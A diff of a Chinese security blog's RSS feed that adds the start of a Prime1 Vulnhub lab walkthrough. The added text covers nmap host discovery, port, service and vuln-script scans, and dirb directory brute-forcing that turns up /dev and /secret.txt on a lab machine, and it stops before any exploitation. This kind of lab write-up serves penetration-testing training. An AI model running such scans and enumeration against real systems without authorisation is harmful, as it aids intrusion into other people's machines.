@@ -1,4 +1,1009 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ke1thLi 的技术笔记</title><link>https://ke1thli.github.io/</link><description>Recent content on Ke1thLi 的技术笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sat, 19 Sep 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://ke1thli.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>DarkHole2.0 Vulunhub靶场复现</title><link>https://ke1thli.github.io/p/darkhole2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Sat, 19 Sep 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/darkhole2.0-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="darkhole2-vulunhub靶场复现"&gt;DarkHole2 Vulunhub靶场复现
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Ke1thLi 的技术笔记</title><link>https://ke1thli.github.io/</link><description>Recent content on Ke1thLi 的技术笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 24 Sep 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://ke1thli.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Prime1 Vulunhub靶场复现</title><link>https://ke1thli.github.io/p/prime1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Thu, 24 Sep 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/prime1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="prime-1-vulnhub靶场复现"&gt;Prime 1 Vulnhub靶场复现
+&lt;/h1&gt;&lt;h2 id="靶场介绍"&gt;靶场介绍
+&lt;/h2&gt;&lt;p&gt;靶场地址 &lt;a class="link" href="https://www.vulnhub.com/entry/prime-1,358/" target="_blank" rel="noopener"
+ &gt;https://www.vulnhub.com/entry/prime-1,358/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;介绍如下&lt;/p&gt;
+&lt;p&gt;This machine is designed for those one who is trying to prepare for OSCP or OSCP-Exam.&lt;/p&gt;
+&lt;p&gt;This is first level of prime series. Some help at every stage is given. Machine is lengthy as OSCP and Hackthebox&amp;rsquo;s machines are designed.&lt;/p&gt;
+&lt;p&gt;So you have a target to get root flag as well as user flag. If stuck on a point some help are given at a level of enumeration. If any extra help needed&lt;/p&gt;
+&lt;p&gt;Visit our website &lt;a class="link" href="http://hacknpentest.com" target="_blank" rel="noopener"
+ &gt;http://hacknpentest.com&lt;/a&gt; and &lt;a class="link" href="http://hnpsecurity.com" target="_blank" rel="noopener"
+ &gt;http://hnpsecurity.com&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Some extra improvement needed to my VM please contact me on my email- suraj at hnpsecurity dot com.&lt;/p&gt;
+&lt;h2 id="信息收集"&gt;信息收集
+&lt;/h2&gt;&lt;h3 id="主机发现"&gt;主机发现
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;获取靶机ip为 10.10.10.100&lt;/p&gt;
+&lt;h3 id="端口扫描和漏洞探测"&gt;端口扫描和漏洞探测
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo nmap -sS -sV -O -sC -p- --min-rate &lt;span class="m"&gt;5000&lt;/span&gt; 10.10.10.100 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;端口&lt;/th&gt;
+ &lt;th&gt;服务&lt;/th&gt;
+ &lt;th&gt;标题/版本&lt;/th&gt;
+ &lt;th&gt;备注&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;22&lt;/td&gt;
+ &lt;td&gt;SSH (OpenSSH 7.2p2)&lt;/td&gt;
+ &lt;td&gt;OpenSSH 7.2p2 Ubuntu 4ubuntu2.8&lt;/td&gt;
+ &lt;td&gt;登录入口，远程管理&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;80&lt;/td&gt;
+ &lt;td&gt;HTTP (Apache httpd 2.4.18)&lt;/td&gt;
+ &lt;td&gt;HacknPentest / Apache 2.4.18 (Ubuntu)&lt;/td&gt;
+ &lt;td&gt;Web 入口；待后续目录/参数枚举&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;再附上nmap漏洞脚本跑出的信息&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo nmap --script&lt;span class="o"&gt;=&lt;/span&gt;vuln -p22,80 10.10.10.100 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Starting Nmap 7.99 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2026-09-23 11:10 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; 10.10.10.100
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.00053s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PORT STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;22/tcp open ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;80/tcp open http
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-dombased-xss: Couldn&lt;span class="s1"&gt;&amp;#39;t find any DOM based XSS.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;|_http-csrf: Couldn&amp;#39;&lt;/span&gt;t find any CSRF vulnerabilities.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-vuln-cve2017-1001000: ERROR: Script execution failed &lt;span class="o"&gt;(&lt;/span&gt;use -d to debug&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; http-enum: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt; /wordpress/: Blog
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_ /wordpress/wp-login.php: Wordpress login page.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;|&lt;/span&gt;_http-stored-xss: Couldn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t find any stored XSS vulnerabilities.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;MAC Address: 00:0C:29:DD:65:2C &lt;span class="o"&gt;(&lt;/span&gt;VMware&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;端口&lt;/th&gt;
+ &lt;th&gt;服务&lt;/th&gt;
+ &lt;th&gt;漏洞扫描发现&lt;/th&gt;
+ &lt;th&gt;备注&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;22&lt;/td&gt;
+ &lt;td&gt;SSH&lt;/td&gt;
+ &lt;td&gt;未返回相关漏洞脚本结果&lt;/td&gt;
+ &lt;td&gt;远程登录入口&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;80&lt;/td&gt;
+ &lt;td&gt;HTTP&lt;/td&gt;
+ &lt;td&gt;&lt;code&gt;http-enum&lt;/code&gt; 发现：&lt;code&gt;/wordpress/&lt;/code&gt;（Blog）、&lt;code&gt;/wordpress/wp-login.php&lt;/code&gt;（WordPress 登录页）；未发现 DOM XSS、CSRF、存储 XSS；http-vuln-cve2017-1001000 脚本执行失败（可忽略）&lt;/td&gt;
+ &lt;td&gt;存在 WordPress 站点，是当前主要 Web 攻击面&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="web服务探测"&gt;Web服务探测
+&lt;/h3&gt;&lt;p&gt;对80端口进行访问,只是一张图片，查看源代码没有任何提示，接下来进行目录爆破&lt;/p&gt;
+&lt;h3 id="目录爆破"&gt;目录爆破
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo dirb http://10.10.10.100
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;总结一下信息&lt;/p&gt;
+&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;路径&lt;/th&gt;
+ &lt;th&gt;状态码&lt;/th&gt;
+ &lt;th&gt;大小&lt;/th&gt;
+ &lt;th&gt;备注&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/dev&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;200&lt;/td&gt;
+ &lt;td&gt;131&lt;/td&gt;
+ &lt;td&gt;最可疑，不是标准页面，字节数很小，可能是提示页或参数入口&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/index.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;200&lt;/td&gt;
+ &lt;td&gt;136&lt;/td&gt;
+ &lt;td&gt;根目录首页，也建议查看内容&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/javascript/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;静态资源目录&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/javascript/jquery/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;jQuery 目录&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/javascript/jquery/jquery&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;200&lt;/td&gt;
+ &lt;td&gt;284394&lt;/td&gt;
+ &lt;td&gt;疑似 jQuery 库文件&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/server-status&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;403&lt;/td&gt;
+ &lt;td&gt;277&lt;/td&gt;
+ &lt;td&gt;Apache 状态页，被禁止访问&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;WordPress 站点&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/index.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;301&lt;/td&gt;
+ &lt;td&gt;0&lt;/td&gt;
+ &lt;td&gt;重定向&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-admin/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;WordPress 后台&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-content/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;WordPress 内容目录&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-includes/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;可列目录&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/xmlrpc.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;405&lt;/td&gt;
+ &lt;td&gt;42&lt;/td&gt;
+ &lt;td&gt;XML-RPC 开启，GET 不允许，后续可关注&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-content/uploads/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;可列目录&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-content/plugins/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;插件目录&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-content/themes/&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;目录&lt;/td&gt;
+ &lt;td&gt;-&lt;/td&gt;
+ &lt;td&gt;主题目录&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-admin/network/admin.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;302&lt;/td&gt;
+ &lt;td&gt;0&lt;/td&gt;
+ &lt;td&gt;需登录/跳转&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-admin/network/index.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;302&lt;/td&gt;
+ &lt;td&gt;0&lt;/td&gt;
+ &lt;td&gt;需登录/跳转&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-admin/user/admin.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;302&lt;/td&gt;
+ &lt;td&gt;0&lt;/td&gt;
+ &lt;td&gt;需登录/跳转&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/wordpress/wp-admin/user/index.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;302&lt;/td&gt;
+ &lt;td&gt;0&lt;/td&gt;
+ &lt;td&gt;需登录/跳转&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;关键点：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;/dev 是最值得先手工看的路径，返回 200 且只有 131 字节。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;/index.php 也只有 136 字节，可能不是普通首页。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;WordPress 是主要攻击面，xmlrpc.php 开启，uploads/、wp-includes/ 等目录可列。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;server-status 是 403，暂时不用管。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="漏洞发现及其利用"&gt;漏洞发现及其利用
+&lt;/h2&gt;&lt;h3 id="访问dev-目录"&gt;访问/dev 目录
+&lt;/h3&gt;&lt;p&gt;获取到一些文本&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;hello,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;now you are at level 0 stage.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;In real life pentesting we should use our tools to dig on a web very hard.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Happy hacking.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;提示我们需要对/dev进一步挖掘,或者我们需要对目录爆破更详细，试下附带扩展名爆破&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo dirb http://10.10.10.100 -X .txt,.php,.zip
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;DIRB v2.22
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;By The Dark Raver
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;START_TIME: Wed Sep &lt;span class="m"&gt;23&lt;/span&gt; 11:37:31 &lt;span class="m"&gt;2026&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;URL_BASE: http://10.10.10.100/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;EXTENSIONS_LIST: &lt;span class="o"&gt;(&lt;/span&gt;.txt,.php,.zip&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;.txt&lt;span class="o"&gt;)(&lt;/span&gt;.php&lt;span class="o"&gt;)(&lt;/span&gt;.zip&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;NUM&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 3&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;GENERATED WORDS: &lt;span class="m"&gt;4612&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;---- Scanning URL: http://10.10.10.100/ ----
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ http://10.10.10.100/image.php &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:147&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ http://10.10.10.100/index.php &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:136&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;+ http://10.10.10.100/secret.txt &lt;span class="o"&gt;(&lt;/span&gt;CODE:200&lt;span class="p"&gt;|&lt;/span&gt;SIZE:412&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-----------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;END_TIME: Wed Sep &lt;span class="m"&gt;23&lt;/span&gt; 11:37:40 &lt;span class="m"&gt;2026&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;DOWNLOADED: &lt;span class="m"&gt;13836&lt;/span&gt; - FOUND: &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;wordpress不应该扫出这点php文件&lt;/p&gt;
+&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;路径&lt;/th&gt;
+ &lt;th&gt;状态码&lt;/th&gt;
+ &lt;th&gt;大小&lt;/th&gt;
+ &lt;th&gt;备注&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/image.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;200&lt;/td&gt;
+ &lt;td&gt;147&lt;/td&gt;
+ &lt;td&gt;根目录首页&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/index.php&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;200&lt;/td&gt;
+ &lt;td&gt;136&lt;/td&gt;
+ &lt;td&gt;根目录首页&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;&lt;code&gt;/secret.txt&lt;/code&gt;&lt;/td&gt;
+ &lt;td&gt;200&lt;/td&gt;
+ &lt;td&gt;412&lt;/td&gt;
+ &lt;td&gt;&lt;strong&gt;新增，文本文件，极可能包含凭据或提示&lt;/strong&gt;&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="访问secrettxt"&gt;访问/secret.txt
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
